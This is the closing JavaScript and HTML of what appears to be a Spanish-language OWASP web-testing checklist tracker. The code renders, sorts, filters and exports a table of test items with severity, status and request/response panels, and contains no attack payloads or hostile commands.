    if(col==='id')   { va=parseInt(a.id.split('-')[1]); vb=parseInt(b.id.split('-')[1]); }
    else if(col==='cat')  { va=CAT_ORD[a.cat]??99;  vb=CAT_ORD[b.cat]??99; }
    else if(col==='sev')  { va=SEV_ORD[a.sev]??99;  vb=SEV_ORD[b.sev]??99; }
    else if(col==='box')  { va=BOX_ORD[a.box]??99;  vb=BOX_ORD[b.box]??99; }
    else if(col==='name') { va=a.name.toLowerCase(); vb=b.name.toLowerCase(); }
    else if(col==='sta')  { va=STA_ORD[state[a.id]]??99; vb=STA_ORD[state[b.id]]??99; }
    else return 0;
    return va<vb?-sortDir:va>vb?sortDir:0;
  });
  reRender();
});
function makeRow(c){
  const tr = document.createElement('tr');
  tr.dataset.id = c.id;
  // Estado
  const tdSta = document.createElement('td'); tdSta.className='sel-td';
  const sm = STA_META[state[c.id]];
  tdSta.innerHTML=`<div class="cd" id="sta-wrap-${c.id}">
    <div class="cd-btn" id="sta-btn-${c.id}" onclick="event.stopPropagation();openCD('sta-menu-${c.id}',this)"
         style="background:${sm.bg};color:${sm.color};border-color:${sm.border}">
      <span class="cd-lbl">${state[c.id]}</span><span class="cd-arr">▾</span>
    </div>
    <div class="cd-menu" id="sta-menu-${c.id}">
      <div class="cd-opt" onclick="event.stopPropagation();pickSta('${c.id}','Pendiente')"><span class="cd-dot" style="background:#fab387"></span>Pendiente</div>
      <div class="cd-opt" onclick="event.stopPropagation();pickSta('${c.id}','Completado')"><span class="cd-dot" style="background:#a6e3a1"></span>Completado</div>
      <div class="cd-opt" onclick="event.stopPropagation();pickSta('${c.id}','No aplica')"><span class="cd-dot" style="background:#7c8db5"></span>No aplica</div>
    </div></div>`;
  tr.appendChild(tdSta);
  // ID
  const tdId = document.createElement('td'); tdId.className='id-cell'; tdId.textContent=c.id; tr.appendChild(tdId);
  // Cat
  const tdCat = document.createElement('td');
  tdCat.innerHTML=`<span class="badge bc-${c.cat}">${c.catLabel}</span>`; tr.appendChild(tdCat);
  // Sev
  const tdSev = document.createElement('td'); tdSev.className='sel-td';
  const sevm = SEV_META[c.sev]||SEV_META['Media'];
  tdSev.innerHTML=`<div class="cd" id="sev-wrap-${c.id}">
    <div class="cd-btn" id="sev-btn-${c.id}" onclick="event.stopPropagation();openCD('sev-menu-${c.id}',this)"
         style="background:${sevm.bg};color:${sevm.color};border-color:${sevm.border}">
      <span class="cd-lbl">${c.sev}</span><span class="cd-arr">▾</span>
    </div>
    <div class="cd-menu" id="sev-menu-${c.id}">
      <div class="cd-opt" onclick="event.stopPropagation();pickSev('${c.id}','Crítica')"><span class="cd-dot" style="background:#c4b5fd"></span>Crítica</div>
      <div class="cd-opt" onclick="event.stopPropagation();pickSev('${c.id}','Alta')"><span class="cd-dot" style="background:#fb7185"></span>Alta</div>
      <div class="cd-opt" onclick="event.stopPropagation();pickSev('${c.id}','Media')"><span class="cd-dot" style="background:#fde047"></span>Media</div>
      <div class="cd-opt" onclick="event.stopPropagation();pickSev('${c.id}','Baja')"><span class="cd-dot" style="background:#86efac"></span>Baja</div>
      <div class="cd-opt" onclick="event.stopPropagation();pickSev('${c.id}','Informativa')"><span class="cd-dot" style="background:#67e8f9"></span>Informativa</div>
    </div></div>`;
  tr.appendChild(tdSev);
  // Box
  const tdBox = document.createElement('td');
  tdBox.innerHTML=`<span class="badge ${BOX_CLS[c.box]||'bx-gray'}">${c.box}</span>`; tr.appendChild(tdBox);
  // Name
  const tdName = document.createElement('td'); tdName.className='name-cell';
  tdName.innerHTML=`${c.name}<span class="row-icon">→</span>`; tr.appendChild(tdName);
  // Desc
  const tdDesc = document.createElement('td'); tdDesc.className='desc-cell';
  tdDesc.textContent=c.desc.length>150?c.desc.slice(0,147)+'…':c.desc; tr.appendChild(tdDesc);
  // HTTP
  const tdHttp = document.createElement('td'); tdHttp.className='http-cell';
  tdHttp.innerHTML=c.http.split('\n').map(l=>
    l.includes('→ vulnerable')?`<span class="hv">${l}</span>`:
    l.includes('→ correcto')?`<span class="ho">${l}</span>`:l
  ).join('<br>'); tr.appendChild(tdHttp);
  // CID
  const tdCid = document.createElement('td');
  let cidHtml='';
  if(c.cid.c!=='–') cidHtml+=`<div class="cid-mini"><b>C:</b> ${c.cid.c}</div>`;
  if(c.cid.i!=='–') cidHtml+=`<div class="cid-mini"><b>I:</b> ${c.cid.i}</div>`;
  if(c.cid.d!=='–') cidHtml+=`<div class="cid-mini"><b>D:</b> ${c.cid.d}</div>`;
  tdCid.innerHTML=cidHtml||'<span style="color:var(--text3)">–</span>'; tr.appendChild(tdCid);
  tr.addEventListener('click',()=>{ if(activeId===c.id){ closePanel(); } else { openPanel(c.id); } });
  return tr;
}
function pickSta(id, val){
  state[id]=val;
  const m=STA_META[val];
  const btn=document.getElementById('sta-btn-'+id);
  if(btn){ btn.style.background=m.bg; btn.style.color=m.color; btn.style.borderColor=m.border; btn.querySelector('.cd-lbl').textContent=val; }
  document.getElementById('sta-menu-'+id)?.classList.remove('open');
  updateStats();
}
function pickSev(id, val){
  const c=CHECKS.find(x=>x.id===id); if(!c) return;
  c.sev=val;
  const m=SEV_META[val];
  const btn=document.getElementById('sev-btn-'+id);
  if(btn){ btn.style.background=m.bg; btn.style.color=m.color; btn.style.borderColor=m.border; btn.querySelector('.cd-lbl').textContent=val; }
  document.getElementById('sev-menu-'+id)?.classList.remove('open');
  if(activeId===id){ const pb=document.getElementById('pSev'); const pl=document.getElementById('pSevLbl'); if(pb&&m) styleCD(pb,m); if(pl) pl.textContent=val; }
  updateStats();
}
function reRender(){
  const tbody=document.getElementById('tbody'); tbody.innerHTML='';
  CHECKS.forEach(c=>tbody.appendChild(makeRow(c))); applyFilters();
  if(activeId){ const tr=document.querySelector(`tr[data-id="${activeId}"]`); if(tr) tr.classList.add('active'); }
}
function openPanel(id){
  const c=CHECKS.find(x=>x.id===id); if(!c) return;
  activeId=id;
  document.getElementById('pId').textContent=c.id;
  const catEl=document.getElementById('pCat'); catEl.textContent=c.catLabel; catEl.className=`badge bc-${c.cat}`;
  const pSevBtn=document.getElementById('pSev'); const pSevLbl=document.getElementById('pSevLbl');
  const sevm=SEV_META[c.sev]; if(pSevBtn&&sevm) styleCD(pSevBtn,sevm); if(pSevLbl) pSevLbl.textContent=c.sev;
  const boxEl=document.getElementById('pBox'); boxEl.textContent=c.box+' Box'; boxEl.className=`badge ${BOX_CLS[c.box]||'bx-gray'}`;
  document.getElementById('pTitle').textContent=c.name;
  document.getElementById('pDesc').textContent=c.desc;
  document.getElementById('pHttp').innerHTML=c.http.split('\n').map(l=>
    `<div class="ph-line ${l.includes('→ vulnerable')?'ph-vuln':l.includes('→ correcto')?'ph-ok':''}">${l}</div>`
  ).join('');
  document.getElementById('pCid').innerHTML=[
    {k:'c',cls:'lc',lbl:'C'},{k:'i',cls:'li',lbl:'I'},{k:'d',cls:'ld',lbl:'D'}
  ].map(({k,cls,lbl})=>`<div class="cid-row"><span class="cid-l ${cls}">${lbl}</span><span class="${c.cid[k]==='–'?'cid-val cid-na':'cid-val'}">${c.cid[k]}</span></div>`).join('');
  switchTab('req');
  document.getElementById('pReq').innerHTML=c.req;
  const resEl=document.getElementById('pRes'); resEl.innerHTML=c.res;
  resEl.className='burp-code burp-res'+(c.vuln?' vuln':'');
  document.getElementById('dotRes').className=`tab-dot ${c.vuln?'dot-res-bad':'dot-res-ok'}`;
  document.getElementById('panel').classList.add('open');
  document.querySelectorAll('#tbody tr').forEach(r=>r.classList.toggle('active',r.dataset.id===id));
}
function closePanel(){
  activeId=null; document.getElementById('panel').classList.remove('open');
  document.querySelectorAll('#tbody tr').forEach(r=>r.classList.remove('active'));
}
function openPanelSevMenu(btn){
  const menu=document.getElementById('pSevMenu'); if(!menu) return;
  document.querySelectorAll('.cd-menu.open').forEach(m=>m.classList.remove('open'));
  const wasOpen=menu.classList.contains('open');
  if(wasOpen){ menu.classList.remove('open'); menu.style.display='none'; return; }
  const r=btn.getBoundingClientRect(); const mh=180;
  const top=(window.innerHeight-r.bottom<mh+6)?r.top-mh-4:r.bottom+3;
  menu.style.top=top+'px'; menu.style.left=r.left+'px'; menu.style.minWidth=r.width+'px';
  menu.style.display='block'; menu.classList.add('open');
}
function onPanelSev(val){
  if(!activeId) return; pickSev(activeId,val);
  const m=SEV_META[val]; const btn=document.getElementById('pSev'); if(btn&&m) styleCD(btn,m);
  const lbl=document.getElementById('pSevLbl'); if(lbl) lbl.textContent=val;
  const menu=document.getElementById('pSevMenu'); if(menu){ menu.classList.remove('open'); menu.style.display='none'; }
}
function switchTab(which){
  document.querySelectorAll('.burp-tab').forEach(t=>t.classList.remove('active'));
  document.querySelectorAll('.burp-pane').forEach(p=>p.classList.remove('active'));
  document.getElementById('tab'+which.charAt(0).toUpperCase()+which.slice(1)).classList.add('active');
  document.getElementById('pane'+which.charAt(0).toUpperCase()+which.slice(1)).classList.add('active');
}
function applyFilters(){
  const q=document.getElementById('fQ').value.toLowerCase();
  const cat=document.getElementById('fCat').value;
  const sev=document.getElementById('fSev').value;
  const sta=document.getElementById('fSta').value;
  const box=document.getElementById('fBox').value;
  document.querySelectorAll('#tbody tr').forEach(tr=>{
    const c=CHECKS.find(x=>x.id===tr.dataset.id);
    if(!c){ tr.classList.add('hidden'); return; }
    const ok=(!q||[c.name,c.desc].join(' ').toLowerCase().includes(q))
      &&(!cat||c.cat===cat)&&(!sev||c.sev===sev)
      &&(!sta||state[c.id]===sta)&&(!box||c.box===box);
    tr.classList.toggle('hidden',!ok);
  });
  updateStats();
}
function updateStats(){
  const hiddenIds=new Set([...document.querySelectorAll('#tbody tr.hidden')].map(r=>r.dataset.id));
  const vis=CHECKS.filter(c=>!hiddenIds.has(c.id));
  const done=CHECKS.filter(c=>state[c.id]==='Completado').length;
  const pct=CHECKS.length?Math.round(done/CHECKS.length*100):0;
  document.getElementById('progFill').style.width=pct+'%';
  document.getElementById('progTxt').textContent=`${done} / ${CHECKS.length}`;
  const sevChips=[
    {dot:'#c4b5fd',sev:'Crítica'},{dot:'#fb7185',sev:'Alta'},
    {dot:'#fde047',sev:'Media'},{dot:'#86efac',sev:'Baja'},{dot:'#67e8f9',sev:'Informativa'}
  ].filter(s=>vis.some(c=>c.sev===s.sev))
   .map(s=>`<div class="chip"><span class="chip-dot" style="background:${s.dot}"></span><b>${vis.filter(c=>c.sev===s.sev).length}</b><span>${s.sev.toLowerCase()}</span></div>`).join('');
  const staChips=[
    {dot:'#a6e3a1',sta:'Completado'},{dot:'#fab387',sta:'Pendiente'},{dot:'#7c8db5',sta:'No aplica'}
  ].filter(s=>vis.some(c=>state[c.id]===s.sta))
   .map(s=>`<div class="chip"><span class="chip-dot" style="background:${s.dot}"></span><b>${vis.filter(c=>state[c.id]===s.sta).length}</b><span>${s.sta.toLowerCase()}</span></div>`).join('');
  document.getElementById('statsRow').innerHTML=
    `<div class="chip"><span class="chip-dot" style="background:var(--accent)"></span><b>${vis.length}</b><span>visible</span></div>`
    +sevChips+staChips;
}
function exportCSV(){
  const hdr=['ID','Categoría','Severidad','Tipo Test','Prueba','Descripción','HTTP Esperado','C','I','D','Estado'];
  const rows=CHECKS.map(c=>[
    c.id,c.catLabel,c.sev,c.box+' Box',
    '"'+c.name.replace(/"/g,'""')+'"',
    '"'+c.desc.replace(/"/g,'""')+'"',
    '"'+c.http.replace(/"/g,'""')+'"',
    '"'+(c.cid.c||'–')+'"','"'+(c.cid.i||'–')+'"','"'+(c.cid.d||'–')+'"',
    state[c.id]
  ]);
  const csv=[hdr,...rows].map(r=>r.join(',')).join('\n');
  const a=document.createElement('a');
  a.href='data:text/csv;charset=utf-8,\uFEFF'+encodeURIComponent(csv);
  a.download='owasp_web_checklist_'+new Date().toISOString().slice(0,10)+'.csv';
  a.click();
}
document.getElementById('tbody').innerHTML='';
CHECKS.forEach(c=>document.getElementById('tbody').appendChild(makeRow(c)));
updateStats();
document.addEventListener('keydown',e=>{ if(e.key==='Escape') closePanel(); });
(()=>{ styleCD(document.getElementById('pSev'),SEV_META['Alta']); })();
</script>

<div class="cd-menu" id="pSevMenu" style="position:fixed;display:none;z-index:99999">
  <div class="cd-opt" onclick="event.stopPropagation();onPanelSev('Crítica')"><span class="cd-dot" style="background:#c4b5fd"></span>Crítica</div>
  <div class="cd-opt" onclick="event.stopPropagation();onPanelSev('Alta')"><span class="cd-dot" style="background:#fb7185"></span>Alta</div>
  <div class="cd-opt" onclick="event.stopPropagation();onPanelSev('Media')"><span class="cd-dot" style="background:#fde047"></span>Media</div>
  <div class="cd-opt" onclick="event.stopPropagation();onPanelSev('Baja')"><span class="cd-dot" style="background:#86efac"></span>Baja</div>
  <div class="cd-opt" onclick="event.stopPropagation();onPanelSev('Informativa')"><span class="cd-dot" style="background:#67e8f9"></span>Informativa</div>
</div>
